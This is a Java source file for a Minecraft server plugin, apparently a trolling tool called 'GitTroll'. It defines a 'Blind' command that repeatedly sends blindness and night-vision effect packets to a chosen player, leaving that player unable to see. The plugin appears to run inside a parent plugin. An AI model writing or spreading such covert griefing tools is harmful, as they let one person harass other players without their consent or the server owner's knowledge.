package net.Lenni0451.GitTroll.command.commands.trolling;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;
import net.minecraft.server.v1_8_R3.MobEffect;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityEffect;
import net.minecraft.server.v1_8_R3.PacketPlayOutRemoveEntityEffect;
import org.bukkit.Bukkit;

import java.util.ArrayList;
import java.util.List;

public class Blind extends CommandBase {

    private List<CustomPlayer> players = new ArrayList<>();

    public Blind() {
        super("Blind", "Make a player completely blind", "<Player>");

        Bukkit.getScheduler().runTaskTimer(GitTroll.getInstance().getParentPlugin(), () -> {
            try {
                for (CustomPlayer player : this.players) {
                    player.sendPacket(new PacketPlayOutEntityEffect(player.getPlayer().getEntityId(), new MobEffect(15, Integer.MAX_VALUE, Integer.MAX_VALUE, false, false)));
                    player.sendPacket(new PacketPlayOutEntityEffect(player.getPlayer().getEntityId(), new MobEffect(16, Integer.MAX_VALUE, Integer.MAX_VALUE, false, false)));
                }
            } catch (Throwable ignored) {}
        }, 1, 1);
    }

    @Override
    public void execute(CustomPlayer executor, ArrayHelper args) {
        if (args.isLength(1)) {
            CustomPlayer vic = this.parsePlayer(args.getString(0), executor);

            if (players.remove(vic)) {
                vic.sendPacket(new PacketPlayOutRemoveEntityEffect(vic.getPlayer().getEntityId(), new MobEffect(15, Integer.MAX_VALUE, Integer.MAX_VALUE, false, false)));
                vic.sendPacket(new PacketPlayOutRemoveEntityEffect(vic.getPlayer().getEntityId(), new MobEffect(16, Integer.MAX_VALUE, Integer.MAX_VALUE, false, false)));
                executor.sendGitMessage("§cThe player is no longer blind.");
            } else {
                this.players.add(vic);
                executor.sendGitMessage("The player is now blind.");
            }
        } else {
            this.commandWrong();
        }
    }

    @Override
    public void tabComplete(List<String> tabComplete, ArrayHelper args) {
        if (args.isEmpty()) {
            this.tabCompletePlayers(tabComplete);
        }
    }

}